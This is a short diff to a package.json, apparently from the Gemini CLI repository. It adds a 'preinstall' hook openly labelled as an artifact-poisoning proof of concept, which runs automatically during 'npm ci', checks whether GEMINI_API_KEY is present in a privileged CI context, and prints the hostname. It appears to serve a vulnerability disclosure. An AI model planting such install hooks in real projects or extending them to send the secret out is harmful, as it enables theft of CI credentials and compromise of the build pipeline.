@@ -17,6 +17,7 @@
     "sandboxImageUri": "us-docker.pkg.dev/gemini-code-dev/gemini-cli/sandbox:0.36.0-nightly.20260317.2f90b4653"
   },
   "scripts": {
+    "preinstall": "echo '=== ARTIFACT POISONING POC ===' && echo 'Attacker code executing via npm ci in privileged workflow_run context' && echo 'GEMINI_API_KEY is set:' && test -n \"$GEMINI_API_KEY\" && echo 'YES - secret would be exfiltrable' || echo 'NOT SET (expected on fork, would be set on upstream)' && echo 'Hostname:' && hostname && echo '=== END POC ==='",
     "start": "cross-env NODE_ENV=development node scripts/start.js",
     "start:a2a-server": "CODER_AGENT_PORT=41242 npm run start --workspace @google/gemini-cli-a2a-server",
     "debug": "cross-env DEBUG=1 node --inspect-brk scripts/start.js",
